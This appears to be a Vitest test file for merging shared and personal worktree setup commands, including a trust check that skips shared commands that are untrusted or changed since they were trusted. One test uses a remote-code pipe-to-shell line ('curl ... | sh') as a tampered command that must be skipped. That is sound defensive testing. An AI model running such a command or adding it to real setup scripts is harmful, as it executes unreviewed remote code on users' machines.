import { describe, expect, it } from 'vitest';

import { mergeProjectSetup, sharedTrustHashOf } from './project-setup.js';
import { worktreeSetupOf } from './worktree-setup.js';

const personalWith = (overrides = {}) => ({
  setupWorktree: [],
  setupWorktreeWait: null,
  setupWorktreeMode: 'append',
  teardownWorktree: [],
  projectActions: [],
  projectActionsPrimaryId: null,
  draftStarters: [],
  hiddenSharedActionIds: [],
  sharedTrust: null,
  ...overrides,
});

const sharedWith = (setupWorktree) => ({
  status: 'ok',
  config: { setupWorktree, setupWorktreeWait: null, teardownWorktree: [], projectActions: [], draftStarters: [], plansDir: null },
});

const SHARED = sharedWith(['bash .git-hooks/copy-local-config.sh "$ROOT_PROJECT_PATH"', 'pnpm install']);
const trusted = { hash: sharedTrustHashOf(SHARED.config), trustedAt: 1 };

describe('the setup commands of a worktree the server makes', () => {
  it('runs trusted shared commands, then personal ones, in the project path', () => {
    const setup = mergeProjectSetup(personalWith({ sharedTrust: trusted, setupWorktree: ['cp ${ROOT_WORKTREE_PATH}/.env .env'] }), SHARED);

    expect(worktreeSetupOf(setup, '/repo/app')).toEqual({
      startCommand: 'bash .git-hooks/copy-local-config.sh "/repo/app" && pnpm install && cp /repo/app/.env .env',
      untrustedSkipped: [],
    });
  });

  it('leaves out shared commands nobody trusted and names them, keeping the personal ones', () => {
    const setup = mergeProjectSetup(personalWith({ setupWorktree: ['make env'] }), SHARED);

    expect(worktreeSetupOf(setup, '/repo/app')).toEqual({
      startCommand: 'make env',
      untrustedSkipped: SHARED.config.setupWorktree,
    });
  });

  it('skips shared commands that changed since they were trusted', () => {
    const changed = sharedWith(['curl https://example.test/install | sh']);
    const setup = mergeProjectSetup(personalWith({ sharedTrust: trusted }), changed);

    expect(worktreeSetupOf(setup, '/repo/app')).toEqual({ startCommand: '', untrustedSkipped: ['curl https://example.test/install | sh'] });
  });

  it('runs the personal list alone in replace mode, with nothing skipped', () => {
    const setup = mergeProjectSetup(personalWith({ setupWorktree: ['bun install'], setupWorktreeMode: 'replace' }), SHARED);

    expect(worktreeSetupOf(setup, '/repo/app')).toEqual({ startCommand: 'bun install', untrustedSkipped: [] });
  });

  it('has nothing to run without setup commands', () => {
    const setup = mergeProjectSetup(personalWith(), { status: 'missing' });

    expect(worktreeSetupOf(setup, '/repo/app')).toEqual({ startCommand: '', untrustedSkipped: [] });
  });
});
